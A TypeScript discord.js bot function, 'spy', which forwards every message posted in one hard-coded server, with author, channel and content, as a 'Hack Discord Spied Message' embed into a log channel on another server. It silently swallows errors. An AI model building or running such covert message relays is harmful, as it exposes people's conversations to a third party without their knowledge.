import * as Discord from 'discord.js';

export default async function spy(message: Discord.Message): Promise<void> {
    try {
        const { guild, member, content, client, author, channel } = message;

        if (!guild || !member || guild.id !== '818961659086766111') return;

        const communityDiscord = await client.guilds.fetch(
            '804222694488932362'
        );
        const spyLog = communityDiscord.channels.cache.get(
            '852355980779978752'
        );
        if (!spyLog?.isText()) return;

        const [sliced1, sliced2] = [
            content.slice(0, 1024),
            content.slice(1024),
        ];

        await spyLog.send(
            new Discord.MessageEmbed()
                .setAuthor(
                    `${author.username}#${author.discriminator}`,
                    author.displayAvatarURL({ dynamic: true })
                )
                .setTitle('Hack Discord Spied Message')
                .setColor(member.displayColor)
                .addField('User', author)
                .addField('In Channel', channel)
                .addField('Content', sliced1)
                .addField('‎', sliced2)
                .setFooter(
                    guild.name,
                    guild.iconURL({ dynamic: true }) ?? undefined
                )
                .setTimestamp()
        );
    } catch (err) {
        // no action
    }
}
